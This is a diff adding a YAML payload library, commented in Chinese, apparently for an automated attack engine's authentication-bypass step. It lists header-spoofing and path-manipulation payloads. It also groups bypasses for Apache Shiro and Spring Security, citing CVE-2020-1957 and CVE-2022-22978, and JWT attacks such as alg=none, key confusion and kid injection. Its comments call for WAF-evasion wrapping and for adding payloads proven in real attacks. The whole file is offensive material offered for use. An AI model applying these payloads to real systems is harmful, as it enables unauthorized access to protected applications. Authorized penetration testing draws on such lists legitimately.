@@ -1,0 +1,49 @@
+# 鉴权绕过 payload 库（域 application 第2步"权限绕过"用）
+#
+# 用法:未授权检测无果后,按 intel 里识别的鉴权框架身份选对应组;
+# 有 WAF 时每条 payload 先经 engine/waf.py advise 的手法包装。
+# 只增不删,实战有效的新 payload reflow 回灌。
+#
+# 原则:绕过手法要能回答"针对哪个框架的哪个已知机制",通用组只作兜底。
+
+# 通用鉴权头/路径绕过(兜底,命中率低,不作主力)
+generic:
+  headers:
+    - "X-Forwarded-For: 127.0.0.1"
+    - "X-Originating-IP: 127.0.0.1"
+    - "X-Original-URL: /admin"
+    - "X-Rewrite-URL: /admin"
+    - "X-Custom-IP-Authorization: 127.0.0.1"
+    - "Referer: <目标内部域>"
+  path:
+    - "追加 /  ..;/  /./  //"
+    - "大小写变换 /Admin"
+    - "URL编码 %2e %2f %252e"
+    - "分号插入 /admin;/  /admin;jsessionid=x"
+
+# 按框架身份分组(由 intel 识别的鉴权框架驱动选择)
+by_framework:
+  shiro:
+    why: "Shiro 路径匹配与容器解析不一致"
+    payloads:
+      - ";/  分号插入"
+      - "//  双斜杠"
+      - "/%2e%2e/  编码.."
+      - "大小写不敏感 /ADMIN"
+    ref: "CVE-2020-1957 模式参考,需实测"
+  spring-security:
+    why: "Filter RequestMatcher 与路由解析不一致"
+    payloads:
+      - "trailing slash /admin/"
+      - "大小写 /Admin"
+      - ";jsessionid=x 插入"
+      - "%2f 编码斜杠"
+    ref: "CVE-2022-22978 模式参考,需实测"
+  jwt:
+    why: "JWT 校验缺陷"
+    payloads:
+      - "alg=none"
+      - "RS256->HS256 key confusion(用公钥当HMAC密钥)"
+      - "弱密钥爆破"
+      - "kid 注入(路径穿越/SQL)"
+      - "不校验 exp/aud/iss"
